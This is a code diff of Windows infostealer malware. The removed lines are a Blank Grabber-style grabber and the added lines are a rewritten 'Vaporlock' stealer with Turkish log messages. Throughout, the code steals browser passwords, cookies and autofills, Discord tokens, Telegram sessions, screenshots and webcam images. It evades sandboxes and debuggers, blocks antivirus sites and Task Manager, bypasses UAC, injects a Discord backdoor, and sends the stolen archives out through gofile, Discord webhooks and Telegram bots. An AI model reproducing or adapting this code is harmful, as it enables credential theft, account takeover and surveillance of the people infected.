-            command = 'JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA='
-            if subprocess.run(['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', command], shell=True, capture_output=True, cwd=self.TempFolder).returncode == 0:
-                self.ScreenshotTaken = True
-
-    @Errors.Catch
-    def BlockSites(self) -> None:
-        if Settings.BlockAvSites:
-            Logger.info('Blocking AV sites')
-            Utility.BlockSites()
-            Utility.TaskKill('chrome', 'firefox', 'msedge', 'safari', 'opera', 'iexplore')
-
-    @Errors.Catch
-    def StealBrowserData(self) -> None:
-        if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory or Settings.CaptureAutofills)):
-            return
-        Logger.info('Stealing browser data')
-        threads: list[Thread] = []
-        paths = {'Brave': (os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'brave'), 'Chrome': (os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'chrome'), 'Chromium': (os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'chromium'), 'Comodo': (os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'comodo'), 'Edge': (os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'msedge'), 'EpicPrivacy': (os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'epic'), 'Iridium': (os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'iridium'), 'Opera': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'opera'), 'Opera GX': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'operagx'), 'Slimjet': (os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'slimjet'), 'UR': (os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'urbrowser'), 'Vivaldi': (os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'vivaldi'), 'Yandex': (os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data'), 'yandex')}
-        for name, item in paths.items():
-            path, procname = item
-            if os.path.isdir(path):
-
-                def run(name, path):
-                    try:
-                        Utility.TaskKill(procname)
-                        browser = Browsers.Chromium(path)
-                        saveToDir = os.path.join(self.TempFolder, 'Credentials', name)
-                        passwords = browser.GetPasswords() if Settings.CapturePasswords else None
-                        cookies = browser.GetCookies() if Settings.CaptureCookies else None
-                        history = browser.GetHistory() if Settings.CaptureHistory else None
-                        autofills = browser.GetAutofills() if Settings.CaptureAutofills else None
-                        if passwords or cookies or history or autofills:
-                            os.makedirs(saveToDir, exist_ok=True)
-                            if passwords:
-                                output = ['URL: {}\nUsername: {}\nPassword: {}'.format(*x) for x in passwords]
-                                with open(os.path.join(saveToDir, '{} Passwords.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
-                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
-                                self.PasswordsCount += len(passwords)
-                            if cookies:
-                                output = ['{}\t{}\t{}\t{}\t{}\t{}\t{}'.format(host, str(expiry != 0).upper(), cpath, str(not host.startswith('.')).upper(), expiry, cname, cookie) for host, cname, cpath, cookie, expiry in cookies]
-                                with open(os.path.join(saveToDir, '{} Cookies.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
-                                    file.write('\n'.join(output))
-                                self.Cookies.extend([str(x[3]) for x in cookies])
-                            if history:
-                                output = ['URL: {}\nTitle: {}\nVisits: {}'.format(*x) for x in history]
-                                with open(os.path.join(saveToDir, '{} History.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
-                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
-                                self.HistoryCount += len(history)
-                            if autofills:
-                                output = '\n'.join(autofills)
-                                with open(os.path.join(saveToDir, '{} Autofills.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
-                                    file.write(output)
-                                self.AutofillCount += len(autofills)
-                    except Exception:
-                        pass
-                t = Thread(target=run, args=(name, path))
-                t.start()
-                threads.append(t)
-        for thread in threads:
-            thread.join()
-        if Settings.CaptureGames:
-            self.StealRobloxCookies()
-
-    @Errors.Catch
-    def Webshot(self) -> None:
-        if Settings.CaptureWebcam:
-            camdir = os.path.join(self.TempFolder, 'Webcam')
-            os.makedirs(camdir, exist_ok=True)
-            camIndex = 0
-            while Syscalls.CaptureWebcam(camIndex, os.path.join(camdir, 'Webcam (%d).bmp' % (camIndex + 1))):
-                camIndex += 1
-                self.WebcamPicturesCount += 1
-            if self.WebcamPicturesCount == 0:
-                shutil.rmtree(camdir)
-
-    @Errors.Catch
-    def StealTelegramSessions(self) -> None:
-        if Settings.CaptureTelegram:
-            Logger.info('Stealing telegram sessions')
-            telegramPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Telegram')] if x is not None])]
-            multiple = len(telegramPaths) > 1
-            saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Telegram')
-            if not telegramPaths:
-                telegramPaths.append(os.path.join(os.getenv('appdata'), 'Telegram Desktop'))
-            for index, telegramPath in enumerate(telegramPaths):
-                tDataPath = os.path.join(telegramPath, 'tdata')
-                loginPaths = []
-                files = []
-                dirs = []
-                has_key_datas = False
-                if os.path.isdir(tDataPath):
-                    for item in os.listdir(tDataPath):
-                        itempath = os.path.join(tDataPath, item)
-                        if item == 'key_datas':
-                            has_key_datas = True
-                            loginPaths.append(itempath)
-                        if os.path.isfile(itempath):
-                            files.append(item)
-                        else:
-                            dirs.append(item)
-                    for filename in files:
-                        for dirname in dirs:
-                            if dirname + 's' == filename:
-                                loginPaths.extend([os.path.join(tDataPath, x) for x in (filename, dirname)])
-                if has_key_datas and len(loginPaths) - 1 > 0:
-                    _saveToDir = saveToDir
-                    if multiple:
-                        _saveToDir = os.path.join(_saveToDir, 'Profile %d' % (index + 1))
-                    os.makedirs(_saveToDir, exist_ok=True)
-                    failed = False
-                    for loginPath in loginPaths:
-                        try:
-                            if os.path.isfile(loginPath):
-                                shutil.copy(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)))
-                            else:
-                                shutil.copytree(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)), dirs_exist_ok=True)
-                        except Exception:
-                            shutil.rmtree(_saveToDir)
-                            failed = True
-                            break
-                    if not failed:
-                        self.TelegramSessionsCount += int((len(loginPaths) - 1) / 2)
-            if self.TelegramSessionsCount and multiple:
-                with open(os.path.join(saveToDir, 'Info.txt'), 'w') as file:
-                    file.write('Multiple Telegram installations are found, so the files for each of them are put in different Profiles')
-
-    @Errors.Catch
-    def StealDiscordTokens(self) -> None:
-        if Settings.CaptureDiscordTokens:
-            Logger.info('Stealing discord tokens')
-            output = list()
-            saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Discord')
-            accounts = Discord.GetTokens()
-            if accounts:
-                for item in accounts:
-                    USERNAME, USERID, MFA, EMAIL, PHONE, VERIFIED, NITRO, BILLING, TOKEN, GIFTS = item.values()
-                    output.append('Username: {}\nUser ID: {}\nMFA enabled: {}\nEmail: {}\nPhone: {}\nVerified: {}\nNitro: {}\nBilling Method(s): {}\n\nToken: {}\n\n{}'.format(USERNAME, USERID, 'Yes' if MFA else 'No', EMAIL, PHONE, 'Yes' if VERIFIED else 'No', NITRO, BILLING, TOKEN, GIFTS).strip())
-                os.makedirs(os.path.join(self.TempFolder, 'Messenger', 'Discord'), exist_ok=True)
-                with open(os.path.join(saveToDir, 'Discord Tokens.txt'), 'w', encoding='utf-8', errors='ignore') as file:
-                    file.write(self.Separator.lstrip() + self.Separator.join(output))
-                self.DiscordTokensCount += len(accounts)
-        if Settings.DiscordInjection and (not Utility.IsInStartup()):
-            paths = Discord.InjectJs()
-            if paths is not None:
-                Logger.info('Injecting backdoor into discord')
-                for dir in paths:
-                    appname = os.path.basename(dir)
-                    Utility.TaskKill(appname)
-                    for root, _, files in os.walk(dir):
-                        for file in files:
-                            if file.lower() == appname.lower() + '.exe':
-                                time.sleep(3)
-                                filepath = os.path.dirname(os.path.realpath(os.path.join(root, file)))
-                                UpdateEXE = os.path.join(dir, 'Update.exe')
-                                DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
-                                subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-
-    def CreateArchive(self) -> tuple[str, str]:
-        Logger.info('Creating archive')
-        rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
-        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
-            rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
-            if os.path.isfile(rarPath):
-                password = Settings.ArchivePassword or 'blank123'
-                process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(rarPath, password, self.ArchivePath), capture_output=True, shell=True, cwd=self.TempFolder)
-                if process.returncode == 0:
-                    return 'rar'
-        shutil.make_archive(self.ArchivePath.rsplit('.', 1)[0], 'zip', self.TempFolder)
-        return 'zip'
-
-    def UploadToExternalService(self, path, filename=None) -> str | None:
-        if os.path.isfile(path):
-            Logger.info('Uploading %s to gofile' % (filename or 'file'))
-            with open(path, 'rb') as file:
-                fileBytes = file.read()
-            if filename is None:
-                filename = os.path.basename(path)
-            http = PoolManager(cert_reqs='CERT_NONE')
+    def start_stealer(self, zip_file):
+        try:
             try:
-                server = json.loads(http.request('GET', 'https://api.gofile.io/getServer').data.decode(errors='ignore'))['data']['server']
-                if server:
-                    url = json.loads(http.request('POST', 'https://{}.gofile.io/uploadFile'.format(server), fields={'file': (filename, fileBytes)}).data.decode(errors='ignore'))['data']['downloadPage']
-                    if url:
-                        return url
-            except Exception:
+                interesting_files = StealerFunctions.Interesting_Files(zip_file)
+                print("İlgili dosyalar toplandı:", interesting_files)
+            except:
+                print("İlgili dosyalar toplanırken hata.")
+            try:
+                screenshot_taken = StealerFunctions.Screenshot(zip_file)
+                print("Ekran görüntüsü toplandı:", screenshot_taken)
+            except:
+                print("Ekran görüntüsü toplanırken hata.")
+            try:
+                antivirus_count = StealerFunctions.AntiVirus_Infos(zip_file)
+                print("Antivirüs bilgisi toplandı:", antivirus_count)
+            except:
+                print("Antivirüs bilgisi toplanırken hata.")
+            try:
+                discord_tokens = StealerFunctions.Discord_Tokens(zip_file)
+                print("Discord token toplandı:", discord_tokens)
+            except:
+                print("Discord token toplanırken hata.")
+            try:
+                roblox_cookies = StealerFunctions.Roblox_Cookies(zip_file)
+                print("Roblox kurabiyesi toplandı:", roblox_cookies)
+            except:
+                print("Roblox kurabiyesi toplanırken hata.")
+            try:
+                session_files = StealerFunctions.Session_files(zip_file, self.session_files)
+                print("Oturum dosyaları toplandı:", session_files)
+            except:
+                print("Oturum dosyaları toplanırken hata.")
+            try:
+                browser_Infos = StealerFunctions.Browser_Infos(zip_file, self.browser_infos)
+                print("Tarayıcı bilgileri toplandı:", browser_Infos)
+            except:
+                print("Tarayıcı bilgileri toplanırken hata.")
+            try:
+                webcam_taken = StealerFunctions.Webcam(zip_file)
+                print("Kamera fotoğrafı toplandı:", webcam_taken)
+            except:
+                print("Kamera fotoğrafı toplanırken hata.")
+            try:
+                system_infos = StealerFunctions.System_Infos(zip_file)
+                print("Sistem bilgisi toplandı:", system_infos)
+            except:
+                print("Sistem bilgisi toplanırken hata.")
+
+            return True
+        except Exception as e:
+            print('Exeption (start_stealer): ', e)
+            return False
+
+    def main(self):
+        try:
+            self.startup_persistence()
+           
+            if not Checks.is_windows():
+                print('Windows işletim sistemi değil')
+                return
+            if not Checks.is_connected():
+                print('İnternet yok')
+                return
+            if Checks.is_sandboxed():
+                print('Vm belirlendi')
+                return
+            if Checks.is_debugged(): 
+                print('algılanan hata ayıklayıcı')
+                return
+            
+            if Checks.is_admin():
+                self.block_task_manager()
+                self.task_manager_blocked = True
+
+            zip_file_path = os.path.join(Paths().temp, self.zip_name)
+            zip_file = zipfile.ZipFile(zip_file_path, "w", zipfile.ZIP_DEFLATED)
+            
+            sucess = self.start_stealer(zip_file)
+
+            zip_file.close()
+
+            if sucess:
+                print("Herşey başarılı.")
+                gofile_url = self.upload_gofile(zip_file_path)
+                if gofile_url:
+                    self.send_webhook(gofile_url=gofile_url, file_path=None)
+                else:
+                    self.send_webhook(gofile_url=None, file_path=zip_file_path)
+
+                self.delete_file(zip_file_path)
+            else:
+                print("Vaporlock Başarasız.")
+            
+            if self.task_manager_blocked:
+                self.unblock_task_manager()
+                self.task_manager_blocked = False
+        except Exception:
+            pass
+
+
+class AntiSandbox:
+    DLL_INDICATORS = [
+        "SbieDll.dll", "VBoxHook.dll", "VBoxSF.dll", "VBoxDisp.dll",
+        "vmcheck.dll", "wpespy.dll", "snxhk.dll", "dbghelp.dll", "dbgcore.dll"
+    ]
+
+    VM_MAC_PREFIXES = [
+        "00:05:69",  # VMware
+        "00:0C:29",
+        "00:1C:14",
+        "00:50:56",
+        "08:00:27",  # VirtualBox
+    ]
+
+    @staticmethod
+    def detect_dlls() -> bool:
+        GetModuleHandle = ctypes.windll.kernel32.GetModuleHandleA
+        for dll in AntiSandbox.DLL_INDICATORS:
+            if GetModuleHandle(dll.encode()) != 0:
+                return True
+        return False
+
+    @staticmethod
+    def detect_mac() -> bool:
+        try:
+            output = subprocess.check_output("getmac", creationflags=0x08000000)
+            output = output.decode(errors="ignore")
+
+            macs = re.findall(r"([0-9A-F]{2}(?:-[0-9A-F]{2}){5})", output, re.I)
+            macs = [mac.replace("-", ":").lower() for mac in macs]
+
+            for mac in macs:
+                if any(mac.startswith(prefix.lower()) for prefix in AntiSandbox.VM_MAC_PREFIXES):
+                    return True
+        except:
+            pass
+        return False
+
+    @staticmethod
+    def detect_hardware() -> bool:
+        try:
+            class MEMORYSTATUS(ctypes.Structure):
+                _fields_ = [
+                    ('dwLength', ctypes.c_ulong),
+                    ('dwMemoryLoad', ctypes.c_ulong),
+                    ('ullTotalPhys', ctypes.c_ulonglong),
+                    ('ullAvailPhys', ctypes.c_ulonglong),
+                    ('ullTotalPageFile', ctypes.c_ulonglong),
+                    ('ullAvailPageFile', ctypes.c_ulonglong),
+                    ('ullTotalVirtual', ctypes.c_ulonglong),
+                    ('ullAvailVirtual', ctypes.c_ulonglong),
+                    ('sullAvailExtendedVirtual', ctypes.c_ulonglong),
+                ]
+
+            mem = MEMORYSTATUS()
+            mem.dwLength = ctypes.sizeof(mem)
+            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
+
+            ram_gb = mem.ullTotalPhys / (1024**3)
+
+            cpu_count = os.cpu_count()
+
+            return ram_gb < 3 or cpu_count <= 2
+
+        except:
+            return False
+
+    @staticmethod
+    def detect_boot_time() -> bool:
+        try:
+            uptime = time.time() - psutil.boot_time()
+            return uptime < 60
+        except:
+            return False
+
+    @staticmethod
+    def detect_wine() -> bool:
+        return os.path.exists("C:\\windows\\system32\\wineboot.exe")
+
+
+class Checks:
+    @staticmethod
+    def is_connected() -> bool:
+        try:
+            requests.get("https://www.google.com", timeout=5)
+            return True
+        except (requests.ConnectionError, requests.Timeout):
+            return False
+    
+    @staticmethod
+    def is_windows() -> bool:
+        return platform.system().lower() == "windows"
+    
+    @staticmethod
+    def is_admin() -> bool:
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except:
+            return False
+
+    @staticmethod
+    def is_sandboxed() -> bool:
+        checks = [
+            AntiSandbox.detect_mac(),
+            AntiSandbox.detect_dlls(),
+            AntiSandbox.detect_wine(),
+            AntiSandbox.detect_hardware(),
+            AntiSandbox.detect_boot_time()
+        ]
+        return any(checks)
+
+    @staticmethod
+    def is_debugged() -> bool:
+        blacklist_programs = ['cheatengine', 'cheat engine', 'x32dbg', 'x64dbg', 'ollydbg', 'windbg', 'ida', 'ida64', 'ghidra', 'radare2', 'radare', 'dbg', 'immunitydbg', 'dnspy', 'softice', 'edb', 'debugger', 'visual studio debugger', 'lldb', 'gdb', 'valgrind', 'hex-rays', 'disassembler', 'tracer', 'debugview', 'procdump', 'strace', 'ltrace', 'drmemory', 'decompiler', 'hopper', 'binary ninja', 'bochs', 'vdb', 'frida', 'api monitor', 'process hacker', 'sysinternals', 'procexp', 'process explorer', 'monitor tool', 'vmmap', 'xperf', 'perfview', 'py-spy', 'strace-log', "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "vmwareuser", "wireshark", "procmon"]
+        try:
+            for proc in psutil.process_iter(['name']):
                 try:
-                    Logger.error('Failed to upload to gofile, trying to upload to anonfiles')
-                    url = json.loads(http.request('POST', 'https://api.anonfiles.com/upload', fields={'file': (filename, fileBytes)}).data.decode(errors='ignore'))['data']['file']['url']['short']
-                    return url
-                except Exception:
-                    Logger.error('Failed to upload to anonfiles')
-                    return None
+                    name = proc.info['name'].lower()
+                    if any(x in name for x in blacklist_programs):
+                        return True
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    continue
+        except Exception:
+            pass
 
-    def SendData(self) -> None:
-        Logger.info('Sending data to C2')
-        extention = self.CreateArchive()
-        if not os.path.isfile(self.ArchivePath):
-            raise FileNotFoundError('Failed to create archive')
-        filename = 'Blank-%s.%s' % (os.getlogin(), extention)
-        computerName = os.getenv('computername') or 'Unable to get computer name'
-        computerOS = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()
-        computerOS = computerOS[2].strip() if len(computerOS) >= 2 else 'Unable to detect OS'
-        totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
-        totalMemory = str(int(int(totalMemory[1]) / 1000000000)) + ' GB' if len(totalMemory) >= 1 else 'Unable to detect total memory'
-        uuid = subprocess.run('wmic csproduct get uuid', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
-        uuid = uuid[1].strip() if len(uuid) >= 1 else 'Unable to detect UUID'
-        cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to detect CPU'
-        gpu = subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()
-        gpu = gpu[2].strip() if len(gpu) >= 2 else 'Unable to detect GPU'
-        productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to get product key'
-        http = PoolManager(cert_reqs='CERT_NONE')
-        try:
-            r: dict = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
-            if r.get('status') != 'success':
-                raise Exception('Failed')
-            data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}"
-            if len(r['reverse']) != 0:
-                data += f"\nReverse DNS: {r['reverse']}"
-        except Exception:
-            ipinfo = '(Unable to get IP info)'
-        else:
-            ipinfo = data
-        system_info = f'Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}'
-        collection = {'Discord Accounts': self.DiscordTokensCount, 'Passwords': self.PasswordsCount, 'Cookies': len(self.Cookies), 'History': self.HistoryCount, 'Autofills': self.AutofillCount, 'Roblox Cookies': self.RobloxCookiesCount, 'Telegram Sessions': self.TelegramSessionsCount, 'Common Files': self.CommonFilesCount, 'Wallets': self.WalletsCount, 'Wifi Passwords': self.WifiPasswordsCount, 'Webcam': self.WebcamPicturesCount, 'Minecraft Sessions': self.MinecraftSessions, 'Epic Session': 'Yes' if self.EpicStolen else 'No', 'Steam Session': 'Yes' if self.SteamStolen else 'No', 'Uplay Session': 'Yes' if self.UplayStolen else 'No', 'Growtopia Session': 'Yes' if self.GrowtopiaStolen else 'No', 'Screenshot': 'Yes' if self.ScreenshotTaken else 'No', 'System Info': 'Yes' if self.SystemInfoStolen else 'No'}
-        grabbedInfo = '\n'.join([key + ' : ' + str(value) for key, value in collection.items()])
-        match Settings.C2[0]:
-            case 0:
-                image_url = 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png'
-                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
-                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
-                    url = self.UploadToExternalService(self.ArchivePath, filename)
-                    if url is None:
-                        raise Exception('Failed to upload to external service')
-                else:
-                    url = None
-                fields = dict()
-                if url:
-                    payload['content'] += ' | Archive : %s' % url
-                else:
-                    fields['file'] = (filename, open(self.ArchivePath, 'rb').read())
-                fields['payload_json'] = json.dumps(payload).encode()
-                http.request('POST', Settings.C2[1], fields=fields)
-            case 1:
-                payload = {'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
-                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40:
-                    url = self.UploadToExternalService(self.ArchivePath, filename)
-                    if url is None:
-                        raise Exception('Failed to upload to external service')
-                else:
-                    url = None
-                fields = dict()
-                if url:
-                    payload['text'] = payload['caption'] + '\n\nArchive : %s' % url
-                    method = 'sendMessage'
-                else:
-                    fields['document'] = (filename, open(self.ArchivePath, 'rb').read())
-                    method = 'sendDocument'
-                token, chat_id = Settings.C2[1].split('$')
-                fields.update(payload)
-                fields.update({'chat_id': chat_id})
-                http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)
-if os.name == 'nt':
-    Logger.info('Process started')
-    if Settings.HideConsole:
-        Syscalls.HideConsole()
-    if not Utility.IsAdmin():
-        Logger.warning('Admin privileges not available')
-        if Utility.GetSelf()[1]:
-            if not '--nouacbypass' in sys.argv and Settings.UacBypass:
-                Logger.info('Trying to bypass UAC (Application will restart)')
-                if Utility.UACbypass():
-                    os._exit(0)
-                else:
-                    Logger.warning('Failed to bypass UAC')
-                    if not Utility.IsInStartup(sys.executable):
-                        logger.info('Showing UAC prompt')
-                        if Utility.UACPrompt(sys.executable):
-                            os._exit(0)
-            if not Utility.IsInStartup() and (not Settings.UacBypass):
-                Logger.info('Showing UAC prompt to user (Application will restart)')
-                if Utility.UACPrompt(sys.executable):
-                    os._exit(0)
